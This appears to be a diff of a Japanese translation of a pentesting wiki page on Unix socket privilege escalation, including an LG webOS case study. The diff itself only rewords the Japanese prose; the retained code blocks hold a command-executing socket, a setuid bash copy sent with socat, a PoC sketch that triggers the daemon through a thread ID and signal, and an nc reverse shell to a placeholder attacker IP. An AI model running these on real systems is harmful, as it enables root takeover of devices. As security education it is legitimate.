@@ -4,7 +4,7 @@
 
 ## PythonによるSocket bindingの例
 
-以下の例では、**unix socketが作成され**（`/tmp/socket_test.s`）、**受信したすべての内容**が`os.system`によって**実行されます**。このようなものを実際の環境で見つけることはないと思いますが、この例の目的は、unix socketsを使用するコードがどのようなものか、そして最悪のケースを想定して入力を管理する方法を確認することです。
+以下の例では、**unix socketが作成され**（`/tmp/socket_test.s`）、**受信したすべてのデータ**が`os.system`によって**実行されます**。このようなものを実環境で見つけることはないと思いますが、この例の目的は、unix socketを使用するコードがどのようなものか、そして最悪のケースを想定して入力を処理する方法を確認することです。
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**実行**：`python s.py` でコードを実行し、**socket がどのようにリッスンしているかを確認**してください：
+**Pythonでコードを実行**: `python s.py` し、**socketがどのようにlistenしているかを確認**してください：
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -37,17 +37,17 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)
+## ケーススタディ: Root-owned UNIX socketによるsignal-triggered escalation (LG webOS)
 
-一部の privileged daemon は、untrusted input を受け付け、privileged actions を thread-ID および signals に結び付ける root-owned UNIX socket を公開しています。protocol により unprivileged client が対象となる native thread を指定できる場合、privileged code path を trigger して privilege escalation できる可能性があります。
+一部の特権daemonは、信頼できない入力を受け付け、特権操作をthread-IDおよびsignalに結び付けるroot-owned UNIX socketを公開しています。protocolによって、権限のないclientが対象となるnative threadを選択できる場合、特権code pathをtriggerしてescalateできる可能性があります。<sup>[[1]](#references)</sup>
 
-Observed pattern:
+確認されたパターン:
 - root-owned socket（例: /tmp/remotelogger）に接続する。
-- thread を作成し、その native thread id（TID）を取得する。
-- TID（packed）と padding を request として送信し、acknowledgement を受信する。
-- その TID に特定の signal を送信し、privileged behaviour を trigger する。
+- threadを作成し、そのnative thread id（TID）を取得する。
+- TID（packed）とpaddingをrequestとして送信し、acknowledgementを受信する。
+- そのTIDに特定のsignalを送信し、特権動作をtriggerする。
 
-Minimal PoC sketch:
+最小限のPoCスケッチ:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -59,17 +59,17 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-これを root shell にするには、シンプルな named-pipe + nc パターンを使用できます:
+これを root shell にするには、単純な named-pipe + nc パターンを使用できます。
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 Notes:
-- この種のbugは、権限のないclient state（TIDs）から派生した値を信頼し、それらをprivilegedなsignal handlerやlogicに紐付けることで発生します。
-- socket上でcredentialsを強制し、message formatを検証し、privilegedなoperationを外部から提供されたthread identifierから切り離すことでhardeningします。
+- この種のバグは、権限のないクライアント状態（TIDs）から得た値を信頼し、それらを権限のある signal handlers やロジックに結び付けることで発生します。
+- socket 上で credentials を強制し、message formats を検証し、権限のある操作を外部から提供された thread identifiers から分離することで harden できます。
 
-## References
+## 参考文献
 
-- [LG WebOS TV Path Traversal、Authentication BypassおよびFull Device Takeover（SSD Disclosure）](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 
 {{#include ../../banners/hacktricks-training.md}}
